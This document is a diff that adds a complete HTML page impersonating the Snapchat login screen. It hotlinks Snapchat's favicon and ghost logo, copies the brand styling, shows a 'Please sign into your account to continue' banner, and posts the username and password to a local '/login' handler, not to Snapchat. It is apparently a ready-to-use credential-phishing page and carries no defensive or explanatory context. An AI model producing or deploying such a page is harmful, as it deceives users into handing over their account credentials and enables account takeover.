@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In - Snapchat</title>
+    <link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico"/>
+    <style>
+        body {
+            margin: 0;
+            font-family: HelveticaNeue-Light,'Helvetica Neue Light','Helvetica Neue',Helvetica,Arial,'Lucida Grande',sans-serif;
+            background-color: #262626;
+            color: #fff;
+        }
+        a {
+            color: #009fda;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .inputBox {
+            font-family: HelveticaNeue-Light,'Helvetica Neue Light','Helvetica Neue',Helvetica,Arial,'Lucida Grande',sans-serif;
+            margin: 0;
+            padding: .67861em 1em;
+            font-size: 1em;
+            background-color: #fff;
+            border: 1px solid rgba(39,41,43,.15);
+            color: rgba(0,0,0,.8);
+            border-radius: .2857rem;
+            width: 304px;
+            height: 38px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        button {
+            cursor: pointer;
+            display: inline-block;
+            background-color: #fffc01;
+            color: #262626;
+            font-family: HelveticaNeue-Light,'Helvetica Neue Light','Helvetica Neue',Helvetica,Arial,'Lucida Grande',sans-serif;
+            padding: 13px 1.5em;
+            font-weight: 700;
+            text-align: center;
+            text-transform: uppercase;
+            border-radius: 5px;
+            width: 304px;
+            height: 38px;
+        }
+        button:hover {
+            background-color: #F4F100;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" style="width:36px;padding-top:80px;padding-bottom:95px;">
+        <font size="48px;"><br>Log In</font><br>
+        <form action="/login" method="post">
+            <input class="inputBox" id="username" name="username" type="text" placeholder="Username" required><br>
+            <input class="inputBox" id="password" name="password" type="password" placeholder="Password" required><br>
+            <button class="button" type="submit">LOG IN</button>
+        </form>
+        <a href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot your password?</a>
+        <div style="position:fixed;background-color:#fff;width:100%;top:0;height:20px;padding:15px;">
+            <font color="#000">Please sign into your account to continue</font>
+        </div>
+    </center>
+</body>
+</html>
